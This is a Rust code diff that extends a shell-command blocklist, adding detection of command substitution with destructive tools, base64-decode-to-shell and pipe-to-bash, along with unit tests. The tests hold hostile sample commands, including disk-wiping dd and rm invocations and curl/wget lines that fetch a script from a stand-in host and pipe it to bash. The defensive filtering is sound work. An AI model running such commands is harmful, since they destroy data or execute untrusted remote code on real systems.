@@ -90,6 +90,36 @@ pub(crate) fn is_command_blocked(cmd: &str) -> bool {
     {
         return true;
     }
+    // $(...) command substitution
+    if normalized.contains("$(")
+        && normalized.contains(')')
+        && (normalized.contains("rm ")
+            || normalized.contains("dd ")
+            || normalized.contains("mkfs")
+            || normalized.contains("shutdown")
+            || normalized.contains("reboot"))
+    {
+        return true;
+    }
+    // Backtick command substitution
+    if normalized.contains('`')
+        && normalized.chars().filter(|&c| c == '`').count() >= 2
+        && (normalized.contains("rm ")
+            || normalized.contains("dd ")
+            || normalized.contains("mkfs")
+            || normalized.contains("shutdown")
+            || normalized.contains("reboot"))
+    {
+        return true;
+    }
+    // base64 ... | sh decode-and-execute
+    if normalized.contains("base64") && (normalized.contains("| sh") || normalized.contains("| bash")) {
+        return true;
+    }
+    // | bash pipe-to-shell
+    if normalized.contains("| bash") || normalized.contains("| /bin/bash") || normalized.contains("| /usr/bin/bash") {
+        return true;
+    }
     false
 }
 
@@ -201,6 +231,58 @@ mod tests {
         assert!(
             !is_command_blocked("/usr/bin/dd --version"),
             "dd version should not be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_command_substitution_dollar_paren() {
+        assert!(
+            is_command_blocked("rm $(find / -name '*.cfg')"),
+            "$() with rm should be blocked"
+        );
+        assert!(
+            is_command_blocked("dd $(echo of=/dev/sda)"),
+            "$() with dd should be blocked"
+        );
+        assert!(
+            !is_command_blocked("echo $(pwd)"),
+            "$() with benign command should be safe"
+        );
+    }
+
+    #[test]
+    fn blocks_backtick_substitution() {
+        assert!(
+            is_command_blocked("rm `find / -name '*.cfg'`"),
+            "backtick with rm should be blocked"
+        );
+        assert!(
+            !is_command_blocked("echo `pwd`"),
+            "backtick with benign command should be safe"
+        );
+    }
+
+    #[test]
+    fn blocks_base64_pipe_sh() {
+        assert!(
+            is_command_blocked("echo 'ZmxhZw==' | base64 -d | sh"),
+            "base64 | sh should be blocked"
+        );
+        assert!(
+            is_command_blocked("cat payload.b64 | base64 -d | bash"),
+            "base64 | bash should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_pipe_bash() {
+        assert!(
+            is_command_blocked("curl http://evil.sh | bash"),
+            "| bash should be blocked"
+        );
+        assert!(
+            is_command_blocked("wget -O- http://evil.sh | /bin/bash"),
+            "| /bin/bash should be blocked"
         );
     }
 }
